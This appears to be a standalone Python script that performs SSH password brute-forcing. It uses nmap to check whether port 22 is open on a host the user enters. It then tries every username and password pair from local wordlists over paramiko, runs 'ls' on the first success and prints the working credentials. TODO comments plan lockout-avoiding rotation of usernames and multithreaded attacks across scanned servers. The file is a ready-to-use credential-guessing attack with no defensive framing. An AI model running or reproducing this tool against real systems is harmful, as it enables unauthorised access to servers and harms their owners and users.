from time import sleep
import paramiko
import nmap

uname_file = "./uname.txt"
psswd_file = "./passwd.txt"

username = None
password = None

#Establish a connection to the server using the username and password provided.
def SSHLogin(host, port, username, password):
    sleep_time = .37
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"Connecting to the server: {username}@{host} {port} with password {password}")
        ssh.connect(host, port, username, password)
        print("SSH login successful")
        
        stdin, stdout, stderr = ssh.exec_command("ls")
        output = stdout.read().decode()
        print(output)
        return True
    
    except paramiko.AuthenticationException:
        print("Authentication failed")
        #print(username,password)
        return False
    
    except paramiko.SSHException as sshException:
        print(f"Unable to establish SSH connection: {sshException}")
        sleep_time += .37
        sleep(sleep_time)
        return False
    
    except Exception as e:
        print(f"Exception in connecting to the server: {e}")
        return False
    
    finally:
        ssh.close()
        sleep(sleep_time)


# Read a list of usernames and passwords from a file.
def attack(uname_file, psswd_file, port, host):
    with open(uname_file, "r") as u:
        user_lines = u.readlines()
        while True:
            for user in user_lines:
                uname = user.strip()            
                with open(psswd_file, "r") as p:
                    for passwd in p:
                        passwd = passwd.strip()
                              
                        if (SSHLogin(host,port,uname,passwd)):
                            print(f"Login successful with {uname} and {passwd}")
                            exit(0)
                       
                        else:
                            print(f"Login failed with {uname} and {passwd}")
                            continue
                        

def host_discovery(host, port):
    nm = nmap.PortScanner()
    tmp_port =int(port)
    
    while host != "exit":
        print(host)
        nm.scan(host, port)
        break
    
    #for host in nm.all_hosts():
    print(f'Host : {host} ({nm[host].hostname()})')
    print(f'Info : {nm[host].tcp(tmp_port)}')
    
    #Checks the results of the nmap scan stored in a dictionary and lookes at the state key.
    if nm[host].tcp(tmp_port)['state'] == 'open':
        print(f"Port {tmp_port} is open on {host}")
        attack(uname_file, psswd_file, port, host)
    else:
        print(f"Port {tmp_port} is closed on {host}")
        
        

#TODO Add a condition to only try a username 3 failed attempts before moving on to the next username then returning to the first username after all usernames have been tried.

#TODO maybe even add multiple threads to try multiple usernames at the same time on different servers as they are scanned by nmap.

#TODO Log any attempts that are made on the server.



def main():
    
    host = input("Enter the IP address of the host you would like to scan: ")
    port = "22"
    
    host_discovery(host, port)
    
    
if __name__ == "__main__":
    main()